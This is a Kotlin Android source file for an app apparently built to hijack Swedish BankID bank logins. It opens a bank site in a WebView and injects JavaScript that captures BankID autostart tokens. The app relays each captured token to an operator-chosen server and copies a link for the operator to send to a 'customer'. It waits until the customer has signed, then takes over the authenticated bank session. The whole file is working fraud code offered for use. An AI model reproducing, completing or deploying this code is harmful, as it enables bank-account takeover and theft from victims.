package com.relay

import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import java.io.BufferedReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    private lateinit var web: WebView
    private lateinit var bar: TextView
    private lateinit var linkView: TextView
    private lateinit var serverField: EditText
    private lateinit var bankField: EditText
    private lateinit var modeBtn: Button
    private lateinit var inBtn: Button
    private lateinit var p: SharedPreferences

    private var baseUrl = ""
    private var bankUrl = ""
    private var last = ""
    private var loginUrl = ""
    private var kund = true
    private var skickat = false
    private var signerad = false
    private var skapar = false
    private var vantande = ""
    private var alive = true

    private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
        "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
        "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
        "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        p = getSharedPreferences("relay", 0)
        baseUrl = p.getString("base", "") ?: ""
        bankUrl = p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/"
        kund = p.getBoolean("kund", true)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        ui()
        alive = true
        poll()
        handleIntent(intent)
    }

    override fun onNewIntent(i: Intent?) {
        super.onNewIntent(i)
        if (i != null) handleIntent(i)
    }

    private fun handleIntent(i: Intent) {
        if (i.action != Intent.ACTION_VIEW) return
        val s = i.data?.toString() ?: return
        val t = tok(s) ?: return
        grab(t)
    }

    private fun ui() {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL

        val rad1 = LinearLayout(this)
        rad1.orientation = LinearLayout.HORIZONTAL

        serverField = EditText(this)
        serverField.hint = "server-url"
        serverField.setText(baseUrl)
        rad1.addView(serverField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        val run = Button(this)
        run.text = "KOR"
        run.setOnClickListener {
            baseUrl = serverField.text.toString().trim().trimEnd('/')
            p.edit().putString("base", baseUrl).apply()
            last = ""; skickat = false; signerad = false; loginUrl = ""
            inBtn.isEnabled = false
            if ((p.getString("code", "") ?: "").isEmpty()) newSession()
            bar.text = "laddar banksidan"
            web.loadUrl(bankUrl)
        }
        rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
        root.addView(rad1)

        val rad2 = LinearLayout(this)
        rad2.orientation = LinearLayout.HORIZONTAL

        bankField = EditText(this)
        bankField.hint = "bank-url"
        bankField.setText(bankUrl)
        rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        modeBtn = Button(this)
        modeBtn.text = if (kund) "KUND" else "OP"
        modeBtn.setOnClickListener {
            kund = !kund
            modeBtn.text = if (kund) "KUND" else "OP"
            p.edit().putBoolean("kund", kund).apply()
        }
        rad2.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        inBtn = Button(this)
        inBtn.text = "IN"
        inBtn.isEnabled = false
        inBtn.setOnClickListener { taIn() }
        rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val ny = Button(this)
        ny.text = "KOD"
        ny.setOnClickListener { newSession() }
        rad2.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
        root.addView(rad2)

        bar = TextView(this)
        bar.textSize = 11f
        bar.setBackgroundColor(Color.parseColor("#101010"))
        bar.setTextColor(Color.parseColor("#66ff88"))
        bar.setPadding(14, 8, 14, 6)
        bar.text = "redo"
        root.addView(bar)

        linkView = TextView(this)
        linkView.textSize = 11f
        linkView.setTextIsSelectable(true)
        linkView.setBackgroundColor(Color.parseColor("#101010"))
        linkView.setTextColor(Color.parseColor("#66ccff"))
        linkView.setPadding(14, 4, 14, 10)
        linkView.text = "kundlank hamnar har"
        root.addView(linkView)

        web = WebView(this)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.databaseEnabled = true
        web.settings.setSupportMultipleWindows(true)
        web.settings.javaScriptCanOpenWindowsAutomatically = true
        try {
            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
        } catch (t: Throwable) {}

        web.webViewClient = object : WebViewClient() {

            override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
                return fanga(r.url.toString())
            }

            override fun onPageFinished(v: WebView, url: String?) {
                try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
            }

            override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                if (url == null) return
                var s = url.replace("https://", "").replace("http://", "")
                if (s.length > 62) s = s.substring(0, 62)
                bar.text = s
            }
        }

        web.webChromeClient = object : WebChromeClient() {
            override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
                val pop = WebView(this@MainActivity)
                pop.settings.javaScriptEnabled = true
                pop.webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(v2: WebView, r: WebResourceRequest): Boolean {
                        val s = r.url.toString()
                        if (fanga(s)) return true
                        try { web.loadUrl(s) } catch (x: Throwable) {}
                        return true
                    }
                }
                try {
                    (msg.obj as WebView.WebViewTransport).webView = pop
                    msg.sendToTarget()
                } catch (x: Throwable) {
                    return false
                }
                return true
            }
        }

        web.addJavascriptInterface(Bridge(), "Relay")

        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
        setContentView(root)
    }

    private fun fanga(s: String): Boolean {
        val t = tok(s)
        if (t != null) {
            grab(t)
            return true
        }
        if (s.startsWith("bankid:")) return true
        if (s.startsWith("intent:")) {
            if (!kund) {
                try {
                    val i = Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                } catch (x: Throwable) {}
            }
            return true
        }
        return false
    }

    private inner class Bridge {
        @JavascriptInterface
        fun tok(t: String) {
            runOnUiThread { grab(t) }
        }
    }

    private fun tok(s: String): String? {
        val m = Regex("[?&]autostarttoken=([^&#]+)").find(s)
        if (m == null) return null
        val v = Uri.decode(m.groupValues[1])
        if (v.isEmpty() || v == "null") return null
        return v
    }

    private fun grab(t: String) {
        if (t == last) return
        last = t
        loginUrl = try { web.url ?: "" } catch (x: Throwable) { "" }
        val c = p.getString("code", "") ?: ""
        if (c.isEmpty()) { newSession(t); return }
        post("/api/session/" + c + "/token", t)
        skickat = true
        signerad = false
        inBtn.isEnabled = true
        inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
        inBtn.setTextColor(Color.WHITE)
        bar.text = "TOKEN SKICKAT - vanta pa gront"
        if (!kund) {
            try {
                startActivity(Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
            } catch (x: Throwable) {}
        }
    }

    private fun taIn() {
        if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
        val nu = try { web.url ?: "" } catch (x: Throwable) { "" }
        if (loginUrl.isNotEmpty() && nu.isNotEmpty() && nu != loginUrl) {
            bar.text = "sidan har redan gatt vidare - ingen omladdning"
            return
        }
        bankUrl = bankField.text.toString().trim()
        p.edit().putString("bank", bankUrl).apply()
        loginUrl = ""
        bar.text = "TAR IN - laddar banken"
        web.loadUrl(bankUrl)
    }

    private fun visaLank(c: String) {
        val u = baseUrl + "/k/" + c
        linkView.text = u
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("lank", u))
            bar.text = "lank kopierad - klistra in till kunden"
        } catch (t: Throwable) {
            bar.text = "lank ovan - markera och kopiera"
        }
    }

    private fun newSession(after: String? = null) {
        if (after != null) vantande = after
        if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
        if (skapar) return
        skapar = true
        val b = baseUrl
        Thread {
            var c = ""
            try {
                val con = URL(b + "/api/session").openConnection() as HttpURLConnection
                con.requestMethod = "POST"; con.doOutput = true
                con.setRequestProperty("Content-Type", "text/plain")
                con.connectTimeout = 8000; con.readTimeout = 8000
                con.outputStream.write(ByteArray(0)); con.outputStream.flush()
                if (con.responseCode in 200..299)
                    c = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"")
                        .find(con.inputStream.bufferedReader().readText())
                        ?.groupValues?.get(1) ?: ""
                con.disconnect()
            } catch (t: Throwable) {}
            val cc = c
            runOnUiThread {
                skapar = false
                if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
                p.edit().putString("code", cc).apply()
                last = ""; skickat = false; signerad = false; loginUrl = ""
                inBtn.isEnabled = false
                visaLank(cc)
                if (vantande.isNotEmpty()) {
                    val t = vantande
                    vantande = ""
                    last = t
                    post("/api/session/" + cc + "/token", t)
                    skickat = true
                    inBtn.isEnabled = true
                    inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
                    inBtn.setTextColor(Color.WHITE)
                    bar.text = "TOKEN SKICKAT - vanta pa gront"
                }
            }
        }.start()
    }

    private fun poll() {
        Thread {
            while (alive) {
                try { Thread.sleep(2000) } catch (t: Throwable) {}
                if (signerad) continue
                val c = p.getString("code", "") ?: ""
                if (c.isEmpty() || baseUrl.isEmpty()) continue
                try {
                    val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
                    con.connectTimeout = 4000; con.readTimeout = 4000
                    val txt = con.inputStream.bufferedReader().readText()
                    con.disconnect()
                    if (txt.indexOf("\"signed\":true") >= 0) {
                        signerad = true
                        runOnUiThread {
                            inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
                            bar.text = "KUNDEN HAR SIGNERAT - tryck IN"
                        }
                    }
                } catch (t: Throwable) {}
            }
        }.start()
    }

    private fun post(path: String, body: String) {
        if (baseUrl.isEmpty()) return
        val b = baseUrl
        Thread {
            try {
                val con = URL(b + path).openConnection() as HttpURLConnection
                con.requestMethod = "POST"
                con.doOutput = true
                con.setRequestProperty("Content-Type", "text/plain")
                con.connectTimeout = 8000
                con.readTimeout = 8000
                con.outputStream.write(body.toByteArray())
                con.outputStream.flush()
                con.responseCode
                con.disconnect()
            } catch (t: Throwable) {}
        }.start()
    }

    override fun onDestroy() {
        alive = false
        super.onDestroy()
    }

    override fun onBackPressed() {
        if (web.canGoBack()) web.goBack() else super.onBackPressed()
    }
}
